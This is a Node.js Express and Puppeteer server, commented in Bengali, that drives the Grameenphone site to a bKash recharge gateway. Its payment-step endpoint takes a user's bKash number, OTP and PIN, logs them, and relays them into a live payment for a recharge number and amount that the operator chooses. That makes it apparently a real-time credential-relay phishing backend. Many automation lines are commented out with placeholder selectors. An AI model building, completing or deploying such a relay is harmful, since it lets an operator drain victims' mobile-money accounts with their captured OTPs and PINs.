const express = require('express');
const path = require('path');
const puppeteer = require('puppeteer');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

let browserInstance = null;
let pageInstance = null;

// এডমিন প্যানেল বা ব্রাউজার ওপেন করে গ্রামীণফোন সাইট লোড করার রুট
app.get('/api/start-admin', async (req, res) => {
    try {
        if (!browserInstance) {
            browserInstance = await puppeteer.launch({ 
                headless: false, // ব্রাউজার দৃশ্যমান রাখার জন্য যাতে আপনি লগইন করে দিতে পারেন
                defaultViewport: null,
                args: ['--start-maximized']
            });
            const pages = await browserInstance.pages();
            pageInstance = pages[0] || await browserInstance.newPage();
        }

        await pageInstance.goto('https://www.grameenphone.com', { waitUntil: 'networkidle2' });
        res.json({ success: true, message: 'Grameenphone website loaded. Please log in manually if needed.' });
    } catch (error) {
        console.error('Admin Panel Error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// রিয়েল-টাইম পেমেন্ট স্টেপ হ্যান্ডেল করার API
app.post('/api/payment-step', async (req, res) => {
    const data = req.body;

    try {
        if (!pageInstance) {
            return res.status(400).json({ success: false, error: 'Browser not initialized. Please start admin panel first.' });
        }

        if (data.type === 'START_FLOW') {
            console.log(`[Flow Started] Amount: ${data.amount} TK`);
            
            // ইউজার পেমেন্ট বাটনে ক্লিক করার সাথে সাথে এই ফাংশন ব্যাকগ্রাউন্ডে জিপি সাইটে গেটওয়ে পর্যন্ত ওপেন করবে
            await navigateToBkashGateway(data.amount);
            
            res.json({ success: true, message: 'Navigated to bKash gateway successfully.' });
        }
        else if (data.type === 'NUMBER') {
            console.log(`[bKash Number Received & Inputting]: ${data.number}`);
            
            // ইউজার নাম্বার দেওয়ার সাথে সাথে পাপেটিয়ারের মাধ্যমে বক্সে বসানো
            // await pageInstance.type('#bkash-number-input', data.number);
            // await pageInstance.click('#bkash-submit-number-btn');
            
            res.json({ success: true, message: 'Number submitted to browser.' });
        } 
        else if (data.type === 'OTP') {
            console.log(`[bKash OTP Received & Inputting]: ${data.otp}`);
            
            // ইউজার ওটিপি দেওয়ার সাথে সাথে বক্সে বসানো
            // await pageInstance.type('#bkash-otp-input', data.otp);
            // await pageInstance.click('#bkash-submit-otp-btn');
            
            res.json({ success: true, message: 'OTP submitted to browser.' });
        } 
        else if (data.type === 'PIN') {
            console.log(`[bKash PIN Received & Inputting]: PIN submitted.`);
            
            // ইউজার পিন দেওয়ার সাথে সাথে বক্সে বসিয়ে পেমেন্ট কনফার্ম করা
            // await pageInstance.type('#bkash-pin-input', data.pin);
            // await pageInstance.click('#bkash-confirm-btn');
            
            res.json({ success: true, message: 'PIN submitted and payment completed.' });
        }
        else if (data.type === 'RESEND') {
            console.log(`[Resend OTP requested for]: ${data.number}`);
            // await pageInstance.click('#resend-otp-btn');
            res.json({ success: true, message: 'Resend triggered.' });
        }
    } catch (error) {
        console.error('Automation Step Error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ব্যাকগ্রাউন্ডে জিপি সাইটে ক্লিক করে বিকাশ গেটওয়ে পর্যন্ত নিয়ে যাওয়ার ফাংশন
async function navigateToBkashGateway(amount) {
    console.log('Navigating through Grameenphone to bKash gateway...');

    // ১. হোমস্ক্রিন থেকে মাই অফারস সেকশনের নাম্বার কপি করা
    // await pageInstance.click('#my-offers-section');
    // const targetNumber = await pageInstance.$eval('#number-to-copy', el => el.innerText);

    // ২. রিচার্জ আইকনে ক্লিক
    // await pageInstance.click('#recharge-icon');

    // ৩. ইন্টার নাম্বার বক্সে নাম্বার বসানো
    // await pageInstance.type('#recharge-number-box', targetNumber);

    // ৪. ইন্টার অ্যামাউন্ট বক্সে ২০ থেকে ৫০০ এর মধ্যে র‍্যান্ডম অ্যামাউন্ট বসানো
    const randomAmount = amount || (Math.floor(Math.random() * (480 - 20 + 1)) + 20).toString();
    // await pageInstance.type('#recharge-amount-box', randomAmount);

    // ৫. কন্টিনিউ বাটনে ক্লিক
    // await pageInstance.click('#recharge-continue-btn');

    // ৬. পেমেন্ট মেথড থেকে Other Cards & MFS এ ক্লিক
    // await pageInstance.click('#other-cards-mfs-btn');

    // ৭. কন্টিনিউ টু পে বাটনে ক্লিক
    // await pageInstance.click('#continue-to-pay-btn');

    // ৮. মোবাইল ব্যাংকিং অপশন -> বিকাশ অপশন -> পপ-আপে ইয়েস/প্রসিড ক্লিক
    // await pageInstance.click('#mobile-banking-tab');
    // await pageInstance.click('#bkash-option-btn');
    // await pageInstance.click('#popup-yes-proceed-btn');

    console.log('Successfully reached the bKash payment box interface.');
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
